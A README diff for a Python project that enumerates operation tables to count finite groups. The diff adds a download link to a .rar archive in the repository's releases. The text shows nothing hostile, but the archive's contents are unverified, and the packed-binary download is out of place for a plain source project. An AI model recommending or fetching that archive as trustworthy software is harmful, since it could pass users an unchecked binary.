@@ -1,2 +1,4 @@
 # Group-Explorer-Brute-Force-Enumeration-of-Finite-Groups
 This Python project exhaustively generates every possible binary operation table on a set of size n and then filters these tables to determine which ones satisfy the axioms of a group. It verifies group properties by checking for closure, associativity, the existence of an identity element, and inverses for every element. In doing so, the program not only counts the total number of operation tables generated but also reports how many of those define valid group structures. Additionally, it measures the elapsed time for the computation, making it a practical tool for exploring finite group theory through brute-force enumeration.
+# Download Link:
+https://github.com/AmirFlack/Group-Explorer/releases/download/source_code/Group_Explorer1.0.rar
